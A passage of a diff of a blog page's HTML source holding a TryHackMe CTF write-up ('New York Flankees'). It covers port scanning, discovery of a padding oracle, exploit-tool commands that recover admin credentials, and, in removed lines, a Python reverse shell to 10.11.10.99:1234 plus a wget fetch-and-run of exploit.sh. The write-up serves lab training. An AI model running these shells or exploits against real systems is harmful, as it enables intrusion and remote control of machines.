AAAAB3NzaC1yc2EAAAADAQABAAABgQDAHznW6yrO1o2or52QbWKmOLRYEcbWUD2zy0gHcYzw2sqhx9U/pJxJOa5Z0fwuMVPjRtqGLOk3EOrBnQ6LstnOyGx0KUsBn3c/hSHNCS9uzVbDzikf6ffQLw0hAcJzSi1EsQDRkeyJ24NuzhQ9RXKO1R1Gr0RB4AcmvIoNspcxV0KTiTOIWuAPiJLiZtsOSS39zghuRjvWwnWQ3jR0X2r5NPjphojx3pKxlDNhf9gpaz2kck/Jv8cfktisANej2q4JY+BEL9VaxyBV8DOq/WU9E8TvIGYEK1sOh1UKCl7JgKBbA+30Wge+/EsiV/zEQooDQvNUT5YgUwCCAdClLYxR996glhDywuGYIAOE/VIP69k0JAbkZy8kwP22t0ZHunJrFaPWL5iw++O6/NKTL2xQXwAmKZu81B7Un3Q35lal7k6YO9agJJ4oxD7z15Ee+eJf4KxSOYhSA89KhDQSbrkpZKMyuJ6uoJHXVVyZmMRO2IaraJaY156vZxe9fkOyLvE= | 256 0e:b9:fd:e8:8a:7c:fc:b9:91:b0:3d:0d:16:c9:43:3c (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN1JAvVFTNHO87FGw+Q3NxpS0st1TbH9/Tn+PLJMBdVQ/NHeBZSdt/954gYSL6c0Plt8YiuVswjf//DSHz1rff0= | 256 9c:be:88:a2:44:56:2b:ba:dd:b9:5a:da:f2:24:8a:f5 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILwrt82psPblgKYPcZ1VkSr/bVktYgYaVX+zqGdFFrwK 8080/tcp open http syn-ack ttl 59 Octoshape P2P streaming web service |_http-title: Hello world! | http-methods: |_ Supported Methods: GET |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above results we found 2 open ports 22(ssh) and 8080(web server) and the operating system is Linux. Starting with port 8080.\n","image":"/posts/thenewyorkflankees/NYFlankees.png","name":"New York Flankees | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/thenewyorkflankees/writeup/"}
+</script>
+
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/logo.png" alt="logo">
+    </a>
+  </div>
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/posts/" title="Post">Post</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none mx-1"></div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+        </i>
+        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+        </i>
+      </div>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+    <div>
+      <a href="/posts/thenewyorkflankees/writeup/">
+        <figure>
+    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/posts/thenewyorkflankees/NYFlankees.png"
+      alt="New York Flankees | THM Writeup" title="New York Flankees | THM Writeup"
+      loading="lazy"
+    >
+  </figure>
+      </a>
+    </div>
+    <div class="flex flex-col gap-y-3 p-6">
+      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+        <a href="/posts/thenewyorkflankees/writeup/">New York Flankees | THM Writeup</a>
+      </h1>
+
+      
+      
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+      
+      <li>
+        <a href="/categories/ctf/"
+          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
+          CTF
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/tags/oracle-padding/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Oracle Padding</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/docker/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Docker</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/series/tryhackme/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Tryhackme</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/platforms/linux/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Linux</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/levels/medium/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Medium</span>
+        </a>
+      </li>
+      
+    
+    
+  </ul>
+
+
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"></path>
+   <path d="M16 3v4"></path>
+   <path d="M8 3v4"></path>
+   <path d="M4 11h16"></path>
+   <path d="M11 15h1"></path>
+   <path d="M12 15v3"></path>
+</svg>
+
+    </i>
+    <time datetime="2024-08-04T07:35:56&#43;05:30">
+      2024-08-04
+    </time>
+  </div>
+
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M6.5 7h11"></path>
+   <path d="M6 20v-2a6 6 0 1 1 12 0v2a1 1 0 0 1 -1 1h-10a1 1 0 0 1 -1 -1z"></path>
+   <path d="M6 4v2a6 6 0 1 0 12 0v-2a1 1 0 0 0 -1 -1h-10a1 1 0 0 0 -1 1z"></path>
+</svg>
+
+    </i>
+    <span>
+      5 minutes to read
+    </span>
+  </div>
+</div>
+
+
+      
+        
+        <section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6">
+          <h2>Table of Contents</h2>
+          <aside><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#tools-used">Tools Used</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#padding-oracle">Padding Oracle</a></li>
+      </ul>
+    </li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#admin-login">Admin login</a></li>
+        <li><a href="#reverse-shell">Reverse Shell</a></li>
+        <li><a href="#interactive-shell">Interactive shell</a></li>
+        <li><a href="#docker">Docker</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside>
+        </section>
+        
+      
+
+      <article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content">
+        <h2 id="introduction">Introduction</h2>
+<p>Detailed walkthrough for <a href="https://tryhackme.com/r/room/thenewyorkflankees" target="_blank" rel="noopener">New York Flankees</a>
+ CTF challenges on <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a>
+.</p>
+<h3 id="tools-used">Tools Used</h3>
+<p>rustscan, burpsuite</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Lets start the process by mapping host-name to target IP address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo <span class="nb">echo</span> <span class="s2">&#34;10.10.140.44 nythm.com&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></div><p>Let&rsquo;s start enumaration process using rustscan portscanner.</p>
+<pre tabindex="0"><code>rustscan -a nythm.com -- -sC -sV         
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -52,29 +421,209 @@ PORT     STATE SERVICE REASON         VERSION
 |_  Supported Methods: GET
 |_http-favicon: Unknown favicon MD5: 6FD74A43E6C5F7502642326FAB0B3E69
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><p>From the above results we found 2 open ports <strong>22(ssh)</strong> and <strong>8080(web server)</strong> and the operating system is <strong>Linux</strong>. Starting with port 8080.</p><figure><img src=/posts/thenewyorkflankees/1.png title="Home Page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Home Page</strong></figcaption></figure><p>This is a blog website of user <strong>Stefan</strong>. Here the word <strong>Oracle</strong> is highlighted 2 times using bold text and image. So, must be using one of the Oracle services.</p><figure><img src=/posts/thenewyorkflankees/2.png title="Admin Login Page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Admin Login Page</strong></figcaption></figure><p>This website have an <strong>admin login page</strong> which will use it in future, as we need to enumarate further to get hints about username or password.</p><figure><img src=/posts/thenewyorkflankees/17.png title="Debug page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Debug page</strong></figcaption></figure><p>This website also have an <strong>Dubug page</strong>, which is giving hints about <strong>Implementation of custom authentication mechanism</strong> and <strong>verbose error (padding)</strong>.</p><figure><img src=/posts/thenewyorkflankees/6.png title="view-source of home page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>view-source of home page</strong></figcaption></figure><p>We found a script in the page while checking the source of the page.</p><figure><img src=/posts/thenewyorkflankees/3.png title="adding cookie using cookie editor extension" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>adding cookie using cookie editor extension</strong></figcaption></figure><p>Tried to bypass the login by adding the <strong>loggedin</strong> cookie using <strong>cookie editor</strong>[firefox extension], but exec.html page gives error.</p><figure><img src=/posts/thenewyorkflankees/7.png title="Inspect: debug.html page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Inspect: debug.html page</strong></figcaption></figure><p>Checking network history of debug.html page, found one interesting request trying to connect to its localhost. Lets change its host to its webserver address.</p><figure><img src=/posts/thenewyorkflankees/10.png title="changing the host using Burpsuite" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>changing the host using Burpsuite</strong></figcaption></figure><p>Changing the host of the request to web server address gives us response: <strong>Custom authentication success</strong>.</p><figure><img src=/posts/thenewyorkflankees/11.png title="modifying the url using Burpsuite" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>modifying the url using Burpsuite</strong></figcaption></figure><p>When modifying the string after <strong>/api/debug/</strong> in the request, we got an error: <strong>Decryption error</strong> as a response. This informs there is some cryptography is being used here. So, I tried to decrypt the string below</p><pre tabindex=0><code>39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4
-</code></pre><p>using various decryption tools, but none of those helped. Proceeding further.</p><h3 id=padding-oracle>Padding Oracle</h3><figure><img src=/posts/thenewyorkflankees/12.png title="Google Search" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Google Search</strong></figcaption></figure><p>After multiple attempts of Google search using hints we have, found an interesting result.</p><figure><img src=/posts/thenewyorkflankees/18.png title="Padding Oracle - HackTricks" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Padding Oracle - HackTricks</strong></figcaption></figure><p><a href=https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv#padding-oracle target=_blank rel=noopener><strong>Padding Oracle - HackTricks</strong></a>
-: The same behaviour (error when modifing the value) we observed in <strong>/api/debug/</strong> request. By this point we got that the web application is vulnerable to <strong>padding oracle vulnerability</strong>.</p><h2 id=exploitation>Exploitation</h2><p>Found multiple exploit codes for this vulnerability when googling it. Search term used <strong>padding oracle vulnerability exploit github</strong>. Two exploits I&rsquo;ve used are below.</p><ol><li><a href=https://github.com/mpgn/Padding-oracle-attack target=_blank rel=noopener>mpgn/Padding-oracle-attack</a>
-- slow and detailed</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python exploit.py -c 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 -l <span class=m>16</span> --host nythm.com:8080 -u /api/debug/ --error <span class=s2>&#34;Decryption error&#34;</span>
-</span></span></code></pre></div><ol start=2><li><a href="https://github.com/glebarez/padre?tab=readme-ov-file" target=_blank rel=noopener>glebarez/padre</a>
-- <a href=https://github.com/glebarez/padre/releases/latest target=_blank rel=noopener>binary</a>
-- fast</li></ol><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>chmod +x padre-linux-amd64
-</span></span><span class=line><span class=cl>./padpadre-linux-amd64re -u <span class=s1>&#39;http://nythm.com:8080/api/debug/$&#39;</span> -e lhex 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4
-</span></span></code></pre></div><p>The above exploits will give the username and password in the format <strong>username:password</strong>, which is the <strong>flag1</strong> of this lab.</p><h3 id=admin-login>Admin login</h3><p>lets use the username:password combination to login the admin panel.</p><figure><img src=/posts/thenewyorkflankees/14.png title="Successful Addmin login" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Successful Addmin login</strong></figcaption></figure><p>Kudos!!! &#x1f929; We found the <strong>flag2</strong>. There is a command box and a submit button which we might be useful to get reverse shell. Lets check its behaviour.</p><figure><img src=/posts/thenewyorkflankees/15.png title="Executing valid command" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Executing valid command</strong></figcaption></figure><p>Executing valid command gives <strong>OK</strong> response.</p><figure><img src=/posts/thenewyorkflankees/16.png title="Executing invalid command" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Executing invalid command</strong></figcaption></figure><p>Executing invalid command gives <strong>empyt response</strong>. Lets use this behaviour to get reverse shell code.</p><h3 id=reverse-shell>Reverse Shell</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -c <span class=s1>&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.11.10.99&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)&#39;</span>
-</span></span><span class=line><span class=cl><span class=c1># Replace the LHOST(10.11.10.99) with your local ip.</span>
-</span></span></code></pre></div><p>Using <a href=https://www.revshells.com/ target=_blank rel=noopener>Reverse Shell Generator</a>
-to get reverse shell commands, and confirming the valid command using response from the command. The above command gives <strong>OK</strong> response, means working without any errors. But not getting reverse shell connection. So, creating a shell script <strong>exploit.sh</strong> in local machine which will be usefull for reverse shell. The contents of the script exploit.sh should be the above command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nvlp <span class=m>1234</span>
-</span></span></code></pre></div><p>Setting up the <strong>listener</strong> in local machine using the above command in the <strong>port 1234</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python -m http.server <span class=m>8000</span>
-</span></span></code></pre></div><p>Starting Python HTTP Server in the directory of exploit.sh script, to transfer it to the target system. This will start the http server in <strong>port 8000</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wget http://10.11.10.99:8000/exploit.sh
-</span></span><span class=line><span class=cl>chmod +x exploit.sh
-</span></span><span class=line><span class=cl>./exploit.sh
-</span></span><span class=line><span class=cl><span class=c1># Replace 10.11.10.99 your local ip address.</span>
-</span></span><span class=line><span class=cl><span class=c1># The above commands should be runned individually.</span>
-</span></span></code></pre></div><p>Running the above commands in exec.html makes reverse shell. Now we are in the target system as <strong>root</strong> user.&#x1f60e;</p><h3 id=interactive-shell>Interactive shell</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl> python3 -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span class=line><span class=cl> ^Z <span class=c1>#(Ctrl+z)</span>
-</span></span><span class=line><span class=cl> stty raw -echo <span class=o>&amp;&amp;</span> <span class=nb>fg</span>
-</span></span><span class=line><span class=cl> <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
-</span></span></code></pre></div><p>Got Interactive shell by running the above commands.</p><p>Lets enumarate the files in the target system for next flag. Found an interesting directory <strong>/app/</strong>.</p><pre tabindex=0><code>root@02e849f307cc:/app# ls
+</code></pre><p>From the above results we found 2 open ports <strong>22(ssh)</strong> and <strong>8080(web server)</strong> and the operating system is <strong>Linux</strong>. Starting with port 8080.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/1.png" title="Home Page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Home Page</strong>
+    </figcaption>  
+</figure>
+
+<p>This is a blog website of user <strong>Stefan</strong>. Here the word <strong>Oracle</strong> is highlighted 2 times using bold text and image. So, must be using one of the Oracle services.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/2.png" title="Admin Login Page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Admin Login Page</strong>
+    </figcaption>  
+</figure>
+
+<p>This website have an <strong>admin login page</strong> which will use it in future, as we need to enumarate further to get hints about username or password.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/17.png" title="Debug page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Debug page</strong>
+    </figcaption>  
+</figure>
+
+<p>This website also have an <strong>Dubug page</strong>, which is giving hints about <strong>Implementation of custom authentication mechanism</strong> and <strong>verbose error (padding)</strong>.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/6.png" title="view-source of home page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>view-source of home page</strong>
+    </figcaption>  
+</figure>
+
+<p>We found a script in the page while checking the source of the page.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/3.png" title="adding cookie using cookie editor extension" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>adding cookie using cookie editor extension</strong>
+    </figcaption>  
+</figure>
+
+<p>Tried to bypass the login by adding the <strong>loggedin</strong> cookie using <strong>cookie editor</strong>[firefox extension], but exec.html page gives error.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/7.png" title="Inspect: debug.html page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Inspect: debug.html page</strong>
+    </figcaption>  
+</figure>
+
+<p>Checking network history of debug.html page, found one interesting request trying to connect to its localhost. Lets change its host to its webserver address.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/10.png" title="changing the host using Burpsuite" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>changing the host using Burpsuite</strong>
+    </figcaption>  
+</figure>
+
+<p>Changing the host of the request to web server address gives us response: <strong>Custom authentication success</strong>.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/11.png" title="modifying the url using Burpsuite" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>modifying the url using Burpsuite</strong>
+    </figcaption>  
+</figure>
+
+<p>When modifying the string after <strong>/api/debug/</strong> in the request, we got an error: <strong>Decryption error</strong> as a response. This informs there is some cryptography is being used here. So, I tried to decrypt the string below</p>
+<pre tabindex="0"><code>39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4
+</code></pre><p>using various decryption tools, but none of those helped. Proceeding further.</p>
+<h3 id="padding-oracle">Padding Oracle</h3>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/12.png" title="Google Search" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Google Search</strong>
+    </figcaption>  
+</figure>
+
+<p>After multiple attempts of Google search using hints we have, found an interesting result.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/18.png" title="Padding Oracle - HackTricks" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Padding Oracle - HackTricks</strong>
+    </figcaption>  
+</figure>
+
+<p><a href="https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv#padding-oracle" target="_blank" rel="noopener"><strong>Padding Oracle - HackTricks</strong></a>
+: The same behaviour (error when modifing the value) we observed in <strong>/api/debug/</strong> request. By this point we got that the web application is vulnerable to <strong>padding oracle vulnerability</strong>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Found multiple exploit codes for this vulnerability when googling it. Search term used <strong>padding oracle vulnerability exploit github</strong>. Two exploits I&rsquo;ve used are below.</p>
+<ol>
+<li><a href="https://github.com/mpgn/Padding-oracle-attack" target="_blank" rel="noopener">mpgn/Padding-oracle-attack</a>
+ - slow and detailed</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python exploit.py -c 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4 -l <span class="m">16</span> --host nythm.com:8080 -u /api/debug/ --error <span class="s2">&#34;Decryption error&#34;</span>
+</span></span></code></pre></div><ol start="2">
